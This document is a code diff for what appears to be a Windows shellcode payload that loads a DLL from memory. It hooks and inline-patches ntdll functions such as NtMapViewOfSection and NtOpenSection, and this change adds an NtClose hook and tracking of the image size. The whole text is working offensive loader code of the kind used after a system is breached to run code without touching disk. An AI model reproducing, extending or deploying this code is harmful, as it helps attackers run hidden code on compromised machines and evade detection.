@@ -94,6 +94,7 @@ typedef NTSTATUS (NTAPI *f_NtCreateSection)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, 
 		ULONG, ULONG, HANDLE);
 typedef NTSTATUS (NTAPI *f_NtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG, ULONG,
 		PLARGE_INTEGER, PULONG, SECTION_INHERIT, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *f_NtClose)(HANDLE);
 
 typedef struct _SHELLCODE_CTX {
 
@@ -105,6 +106,7 @@ typedef struct _SHELLCODE_CTX {
 	/* Allocated memory sections */
 	DWORD				file_address;
 	DWORD				mapped_address;
+	DWORD				size_map;
 
 	/* Hook stub functions */
 	unsigned char			s_NtOpenSection[10];
@@ -112,6 +114,7 @@ typedef struct _SHELLCODE_CTX {
 	unsigned char			s_NtOpenFile[10];
 	unsigned char			s_NtCreateSection[10];
 	unsigned char			s_NtMapViewOfSection[10];
+	unsigned char			s_NtClose[10];
 
 	/* Hooked functions */
 	DWORD				NtOpenSection;
@@ -119,12 +122,15 @@ typedef struct _SHELLCODE_CTX {
 	DWORD				NtOpenFile;
 	DWORD				NtCreateSection;
 	DWORD				NtMapViewOfSection;
+	DWORD				NtClose;
 
-	f_NtOpenSection			p_NtOpenSection;
+	f_NtOpenSection				p_NtOpenSection;
 	f_NtQueryAttributesFile		p_NtQueryAttributesFile;
-	f_NtOpenFile			p_NtOpenFile;
-	f_NtCreateSection		p_NtCreateSection;
+	f_NtOpenFile				p_NtOpenFile;
+	f_NtCreateSection			p_NtCreateSection;
 	f_NtMapViewOfSection		p_NtMapViewOfSection;
+	f_NtClose					p_NtClose;
+
 } SHELLCODE_CTX;
 
 SHELLCODE_CTX *ctx = NULL;
@@ -270,6 +276,7 @@ NTSTATUS NTAPI m_NtMapViewOfSection(
 	if (SectionHandle == (HANDLE)ctx->mapped_address) 
 	{
 		*BaseAddress = (PVOID)ctx->mapped_address;
+		*ViewSize = ctx->size_map;
 
 		/* We assume that the image must be relocated */
 		return STATUS_IMAGE_NOT_AT_BASE;
@@ -288,6 +295,18 @@ NTSTATUS NTAPI m_NtMapViewOfSection(
 		Protect);
 }
 
+/* NtClose hook */
+NTSTATUS NTAPI m_NtClose(
+	HANDLE Handle)
+{
+
+	if (Handle == (HANDLE)ctx->mapped_address)
+	{
+		return STATUS_SUCCESS;
+	}
+
+	return ctx->p_NtClose(Handle);
+}
 
 /* Patch given function */
 void patch_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub, 
@@ -349,6 +368,7 @@ void install_hooks(SHELLCODE_CTX *ctx)
 	f_NtOpenFile lNtOpenFile;
 	f_NtCreateSection lNtCreateSection;
 	f_NtOpenSection lNtOpenSection;
+	f_NtClose lNtClose;
 	HMODULE ntdll;
 
 	if (!(ntdll = LoadLibrary("ntdll")))
@@ -364,6 +384,8 @@ void install_hooks(SHELLCODE_CTX *ctx)
 			"NtCreateSection");
 	lNtOpenSection = (f_NtOpenSection)GetProcAddress(ntdll,
 			"NtOpenSection");
+	lNtClose = (f_NtClose)GetProcAddress(ntdll,
+			"NtClose");
 
 	/* NtMapViewOfSection */
 
@@ -397,6 +419,11 @@ void install_hooks(SHELLCODE_CTX *ctx)
 	patch_function(ctx, (DWORD)lNtOpenSection, ctx->s_NtOpenSection, 
 		(unsigned char *)m_NtOpenSection);
 	ctx->p_NtOpenSection = (f_NtOpenSection)ctx->s_NtOpenSection;
+
+	/* NtClose */
+	patch_function(ctx, (DWORD)lNtClose, ctx->s_NtClose,
+		(unsigned char *)m_NtClose);
+	ctx->p_NtClose = (f_NtClose)ctx->s_NtClose;
 	
 }
 
@@ -438,6 +465,7 @@ void remove_hooks(SHELLCODE_CTX *ctx)
 	f_NtOpenFile lNtOpenFile;
 	f_NtCreateSection lNtCreateSection;
 	f_NtOpenSection lNtOpenSection;
+	f_NtClose lNtClose;
 	HMODULE ntdll;
 
 	if (!(ntdll = LoadLibrary("ntdll")))
@@ -453,6 +481,8 @@ void remove_hooks(SHELLCODE_CTX *ctx)
 			"NtCreateSection");
 	lNtOpenSection = (f_NtOpenSection)GetProcAddress(ntdll,
 			"NtOpenSection");
+	lNtClose = (f_NtClose)GetProcAddress(ntdll,
+			"NtClose");
 
 	/* NtMapViewOfSection */
 	restore_function(ctx, (DWORD)lNtMapViewOfSection, 
@@ -470,6 +500,9 @@ void remove_hooks(SHELLCODE_CTX *ctx)
 	
 	/* NtOpenSection */
 	restore_function(ctx, (DWORD)lNtOpenSection, ctx->s_NtOpenSection);
+
+	/* NtClose */
+	restore_function(ctx, (DWORD)lNtClose, ctx->s_NtClose);
 }
 
 /* Map file in memory as section */
@@ -500,6 +533,8 @@ void map_file(SHELLCODE_CTX *ctx)
 			MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 	}
+
+	ctx->size_map = nt->OptionalHeader.SizeOfImage;
 
 	/* Lock the mapping in memory */
 	{
